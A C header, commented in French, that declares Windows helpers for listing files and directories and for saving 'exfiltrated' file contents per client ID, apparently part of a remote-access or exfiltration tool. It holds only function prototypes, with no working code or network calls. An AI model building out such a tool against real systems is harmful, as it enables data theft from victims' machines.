/**
 * @file file_utils.h
 * @brief Utilitaires de gestion de fichiers
 * @author Valentin Pizzio
 * @date 21/12/2024
 * 
 * Ce fichier définit les fonctions utilitaires pour la manipulation
 * de fichiers, notamment pour l'exfiltration et le listing de fichiers.
 */

#ifndef FILE_UTILS_H
#define FILE_UTILS_H

#include <windows.h>

/**
 * @brief Liste les fichiers disponibles dans le répertoire parent
 * 
 * Cette fonction parcourt le répertoire parent et remplit le buffer avec
 * une liste numérotée des fichiers trouvés.
 * 
 * @param buffer Buffer où stocker la liste des fichiers
 * @param buffer_size Taille maximale du buffer
 */
void list_files(char* buffer, size_t buffer_size);

/**
 * @brief Liste les répertoires disponibles dans le répertoire courant
 * 
 * Cette fonction parcourt le répertoire courant et remplit le buffer avec
 * une liste numérotée des répertoires trouvés, en excluant certains dossiers
 * système et de build.
 * 
 * @param buffer Buffer où stocker la liste des répertoires
 * @param buffer_size Taille maximale du buffer
 */
void list_directories(char* buffer, size_t buffer_size);

/**
 * @brief Sauvegarde le contenu exfiltré d'un fichier
 * 
 * Cette fonction sauvegarde le contenu exfiltré dans un nouveau fichier
 * dans le répertoire exfiltration_result/, avec un nom incluant le timestamp
 * et l'ID du client.
 * 
 * @param content Contenu exfiltré à sauvegarder
 * @param filename Nom du fichier original
 * @param client_id Identifiant du client
 */
void save_exfiltrated_content(const char* content, const char* filename, const char* client_id);

#endif // FILE_UTILS_H
